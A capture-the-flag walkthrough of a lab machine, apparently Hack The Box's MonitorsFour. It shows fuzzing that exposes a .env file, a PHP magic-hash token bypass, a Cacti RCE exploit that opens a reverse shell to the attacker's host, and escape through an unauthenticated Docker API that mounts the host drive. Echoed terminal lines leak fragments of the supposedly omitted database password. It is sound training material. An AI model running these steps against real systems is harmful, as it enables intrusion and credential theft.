## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
- Easy
- Windows
```
## IP-Address
```IP-Address
10.129.246.137
```
## Rust-Scan
```bash
PORT     STATE SERVICE REASON          VERSION
80/tcp   open  http    syn-ack ttl 127 nginx
5985/tcp open  http    syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
## cURL 
```bash
curl -I http://monitorsfour.htb/
HTTP/1.1 405 Method Not Allowed
Server: nginx
Date: Thu, 12 Feb 2026 18:43:51 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/8.3.27
Set-Cookie: PHPSESSID=bfce67898e5bb39f4f4ee43d07831d04; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
```
## Feroxbuster
```bash
feroxbuster -u http://monitorsfour.htb/ \
  -w /usr/share/seclists/Discovery/Web-Content/big.txt \
  -x env,txt,json,yml,yaml,conf,config,log,bak,backup,old \
  -s 200,403 \
  -t 20 \
  --auto-tune
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
──────────────────────────────────────────────────
200      GET       24l       99w      770c http://monitorsfour.htb/static/js/smoothscroll.js
200      GET       38l      117w     2813c http://monitorsfour.htb/static/js/plugins.js
200      GET        1l      393w    15974c http://monitorsfour.htb/static/images/about-us.svg
200      GET        6l       34w     2166c http://monitorsfour.htb/static/images/services/02.png
200      GET       11l       15w      188c http://monitorsfour.htb/static/css/plugins.css
200      GET       96l      239w     4340c http://monitorsfour.htb/login
200      GET        1l      359w    22207c http://monitorsfour.htb/static/images/banner.svg
200      GET        5l       30w     1616c http://monitorsfour.htb/static/images/services/01.png
200      GET        1l      235w    12063c http://monitorsfour.htb/static/images/review.svg
200      GET       19l       62w     3695c http://monitorsfour.htb/static/images/services/04.png
200      GET      935l     1752w    15174c http://monitorsfour.htb/static/css/style.css
200      GET        5l      369w    21003c http://monitorsfour.htb/static/js/popper.min.js
200      GET       71l      130w     1872c http://monitorsfour.htb/static/js/custom.js
200      GET        9l       43w     3028c http://monitorsfour.htb/static/images/services/03.png
200      GET      109l      619w    13655c http://monitorsfour.htb/static/images/service.svg
200      GET        7l      277w    44342c http://monitorsfour.htb/static/js/owl.carousel.min.js
200      GET        7l      683w    60010c http://monitorsfour.htb/static/js/bootstrap.min.js
200      GET      129l      673w    57007c http://monitorsfour.htb/static/admin/assets/images/logo.png
200      GET       87l     1326w   157954c http://monitorsfour.htb/static/admin/assets/images/logo.ico
200      GET        4l     1293w    86709c http://monitorsfour.htb/static/js/jquery-min.js
200      GET      338l      982w    13688c http://monitorsfour.htb/
200      GET        5l        5w       97c http://monitorsfour.htb/.env
200      GET        5l        5w       97c http://monitorsfour.htb/contact
```
- `.env` && `Contact`
```bash
cat env
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=[password omitted]
```
- Lets Search for `Sub-Domain`
```bash
 ffuf -c -u http://monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 3

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1219ms]
:: Progress: [19966/19966] :: Job [1/1] :: 198 req/sec :: Duration: [0:02:12] :: Errors: 0 ::
```
- Add into `/etc/hosts` & then visit to 
```bash
ffuf -c -u http://monitorsfour.htb/user?token=FUZZ -w /usr/share/wordlists/seclists/Pattern-Matching/php-magic-hashes.txt


0e307025                [Status: 200, Size: 1113, Words: 10, Lines: 1,
0e463099                [Status: 200, Size: 1113, Words: 10, Lines: 1, 
0e859873                [Status: 200, Size: 1113, Words: 10, Lines: 1, 
0e920159                [Status: 200, Size: 1113, Words: 10, Lines: 1, 
0e805102                [Status: 200, Size: 1113, Words: 10, Lines: 1, 
0e338008                [Status: 200, Size: 1113, Words: 10, Lines: 1, 
00e00099                [Status: 200, Size: 1113, Words: 10, Lines: 1,
```
- Check the Token
```bash
[{"id":2,
"username":"admin",
"email":"admin@monitorsfour.htb",
"password":"[hash omitted]", - |[password omitted]|
"role":"super user",
"token":"[token omitted]",
"name":"Marcus Higgins",
"position":"System Administrator",
"dob":"1978-04-26",
"start_date":"2021-01-12",
"salary":"320800.00"},

{"id":5,
"username":"mwatson",
"email":"mwatson@monitorsfour.htb",
"password":"[hash omitted]",
"role":"user",
"token":"[token omitted]",
"name":"Michael Watson",
"position":"Website Administrator",
"dob":"1985-02-15",
"start_date":"2021-05-11",
"salary":"75000.00"},

{"id":6,
"username":"janderson",
"email":"janderson@monitorsfour.htb",
"password":"[hash omitted]",
"role":"user",
"token":"[token omitted]",
"name":"Jennifer Anderson",
"position":"Network Engineer",
"dob":"1990-07-16",
"start_date":"2021-06-20",
"salary":"68000.00"},

{"id":7,
"username":"dthompson",
"email":"dthompson@monitorsfour.htb",
"password":"[hash omitted]",
"role":"user",
"token":"[token omitted]",
"name":"David Thompson",
"position":"Database Manager",
"dob":"1982-11-23",
"start_date":"2022-09-15",
"salary":"83000.00"}]
```
- Got Access on `http://cacti.monitorsfour.htb/cacti/index.php`
```Creds
Username - Marcus
Password - [password omitted]
```
- Got the Payload for The `cacti - Tree Graph`
```bash
python3 python.py
Cacti RCE Exploit - CVE-2025-24367
Template ID: 226 (Unix - Logged in Users)
IMPORTANT: Enter the BASE URL (root directory)
Example: http://cacti.monitorsfour.htb/
NOT: http://cacti.monitorsfour.htb/cacti/
[15:14:30] Starting exploit
[*] Target Information:
Cacti BASE URL [http://localhost]: http://cacti.monitorsfour.htb
Username [admin]: Marcus
Password [admin]: [password omitted]
[*] Reverse Shell Setup:
Your IP address: 10.10.14.69
Port [4444]: 4444
```
- Got the Shell
```bash
www-data@821fbd6a43fa:~$ ls -la /home/marcus
ls -la /home/marcus
total 28
drwxr-xr-x 1 marcus marcus 4096 Feb 12 16:29 .
drwxr-xr-x 1 root   root   4096 Nov 10 16:15 ..
-rw-r--r-- 1 marcus marcus  220 Jul 30  2025 .bash_logout
-rw-r--r-- 1 marcus marcus 3526 Jul 30  2025 .bashrc
-rw-r--r-- 1 marcus marcus  807 Jul 30  2025 .profile
-r-xr-xr-x 1 root   root     34 Feb 12 16:27 user.txt
www-data@821fbd6a43fa:~$ cat /home/marcus/user.txt
cat /home/marcus/user.txt
[flag omitted]
```
--- 
## Privilege Escalation
```bash
$ip route
default via 172.18.0.1 dev eth0
172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.3
```
- Got `Resolv.conf`
```bash
 cat /etc/resolv.conf
cat /etc/resolv.conf
# Generated by Docker Engine.
# This file can be edited; Docker Engine will not make further changes once it
# has been modified.
nameserver 127.0.0.11
options ndots:0
# Based on host file: '/etc/resolv.conf' (internal resolver)
# ExtServers: [host(192.168.65.7)]
# Overrides: []
# Option ndots from: internal
```
- Its an Docker, Lets Exploit it 
- Let's Use `.env`
```bash
www-data@821fbd6a43fa:~/html/cacti$ which script
which script
/usr/bin/script
www-data@821fbd6a43fa:~/html/cacti$ script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
www-data@821fbd6a43fa:~/html/cacti$ export TERM=xterm
export TERM=xterm
www-data@821fbd6a43fa:~/html/cacti$ mysql -h mariadb -u monitorsdbuser -p[password omitted] -e "SHOW DATABASES;"
f4t0r -e "SHOW DATABASES;"rsdbuser -pf37p2j8f
+--------------------+
| Database           |
+--------------------+
| information_schema |
| monitorsfour_db    |
+--------------------+
```
- Further
```bash
mysql -h mariadb -u monitorsdbuser -p[password omitted] monitorsfour_db -e "SHOW TABLES;"
f4t0r monitorsfour_db -e "SHOW TABLES;"7p2j8f
+---------------------------+
| Tables_in_monitorsfour_db |
+---------------------------+
| changelog                 |
| customers                 |
| invoice_tasks             |
| invoices                  |
| tasks                     |
| users                     |
+---------------------------+
 www-data@821fbd6a43fa:~/html/cacti$ mysql -h mariadb -u monitorsdbuser -p[password omitted] monitorsfour_db -e "SELECT id,username,email,password,role FROM users;"
f4t0r monitorsfour_db -e "SELECT id,username,email,password,role FROM users;"

| id | username  | email             | password              | role       |

| 2 | admin |admin@monitorsfour.htb|[hash omitted]|super user |
| 5 |mwatson| mwatson@monitorsfour.htb|[hash omitted]|user    |
| 6 |janderson|janderson@monitorsfour.htb|[hash omitted]|user |
| 7 |dthompson|dthompson@monitorsfour.htb|[hash omitted]|user |
```
- Got the Same `Database`
- Its a Docker
```bash
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host proto kernel_lo
       valid_lft forever preferred_lft forever
2: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 0a:1d:ec:c7:b2:9d brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.3/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```
- Check the IP-Docker Host
```bash
for i in $(seq 1 254); do
  curl -s --connect-timeout 1 http://192.168.65.$i:2375/version | grep -q "ApiVersion" && \
  echo "192.168.65.$i:2375 OPEN"
done

192.168.65.7:2375 OPEN
```
- Version
```bash
curl http://192.168.65.7:2375/version
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   852    0   852    0     0  66036      0 --:--:-- --:--:-- --:--:-- 71000
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"28.3.2","Details":{"ApiVersion":"1.51","Arch":"amd64","BuildTime":"2025-07-09T16:13:55.000000000+00:00","Experimental":"false","GitCommit":"e77ff99","GoVersion":"go1.24.5","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","MinAPIVersion":"1.24","Os":"linux"}},{"Name":"containerd","Version":"1.7.27","Details":{"GitCommit":"05044ec0a9a75232cad458027ca83437aae3f4da"}},{"Name":"runc","Version":"1.2.5","Details":{"GitCommit":"v1.2.5-0-g59923ef"}},{"Name":"docker-init","Version":"0.19.0","Details":{"GitCommit":"de40ad0"}}],"Version":"28.3.2","ApiVersion":"1.51","MinAPIVersion":"1.24","GitCommit":"e77ff99","GoVersion":"go1.24.5","Os":"linux","Arch":"amd64","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","BuildTime":"2025-07-09T16:13:55.000000000+00:00"}
```
- Let's Enumerate - `Docker Images Local`
```bash
curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
<7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
"RepoTags":["docker_setup-nginx-php:latest"]
"RepoTags":["docker_setup-mariadb:latest"]
"RepoTags":["alpine:latest"]
```
- Violate this Escalation
```bash
$ cat > /tmp/container.json << 'EOF'
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
EOF
$cd /tmp && python3 -m http.server
```
- Transfer and pwned
```bash
www-data@821fbd6a43fa:/tmp$ curl http:/10.10.14.69:8000/container.json -o /tmp/container.json
www-data@821fbd6a43fa:/tmp$ mv copontainer.sjson
mv copontainer.sjson
mv: missing destination file operand after 'copontainer.sjson'
Try 'mv --help' for more information.
www-data@821fbd6a43fa:/tmp$ mv copontainer.sjson container.json
mv copontainer.sjson container.jsonwww-data@821fbd6a43fa:/tmp$ curl -X POST -H "Content-Type: application/json" \
-d @/tmp/container.json \
< curl -X POST -H "Content-Type: application/json" \d
> -d @/tmp/container.json \
>
http://192.168.65.7:2375/containers/create?name=pwned
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   444    0   232  100   212   3968   3626 --:--:-- --:--:-- --:--:--  7655
{"message":"Conflict. The container name \"/pwned\" is already in use by container \"07bcf44511d9b039ba34fa3291f63dae33e8fac430eaf5e7f0377f7e712a7c37\". You have to remove (or rename) that container to be able to reuse that name."}
```
- Trigger the Vulnerability
```bash
www-data@821fbd6a43fa:/tmp$ curl -X POST -H "Content-Type: application/json" \
-d @/tmp/container.json \
< curl -X POST -H "Content-Type: application/json" \d
> -d @/tmp/container.json \
>
http://192.168.65.7:2375/containers/create?name=pwned
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   444    0   232  100   212   3968   3626 --:--:-- --:--:-- --:--:--  7655
{"message":"Conflict. The container name \"/pwned\" is already in use by container \"07bcf44511d9b039ba34fa3291f63dae33e8fac430eaf5e7f0377f7e712a7c37\". You have to remove (or rename) that container to be able to reuse that name."}

```
- `Pwned` Container `ID` - 07bcf44511d9b039ba34fa329

```bash
www-data@821fbd6a43fa:/tmp$ curl -X POST http://192.168.65.7:2375/containers/07bcf44511d9b039ba34fa329/start
<5.7:2375/containers/07bcf44511d9b039ba34fa329/start
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
  
www-data@821fbd6a43fa:/tmp$ curl http://192.168.65.7:2375/containers/07bcf44511d9b039ba34fa329/logs?stdout=true
<ntainers/07bcf44511d9b039ba34fa329/logs?stdout=true
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    35    0    35    0     0   2467      0 --:--:-- --:--:-- --:--:--  2500
[flag omitted]
```
- Got the Root Flag
## Root Flag
```Flag
[flag omitted]
```
## END
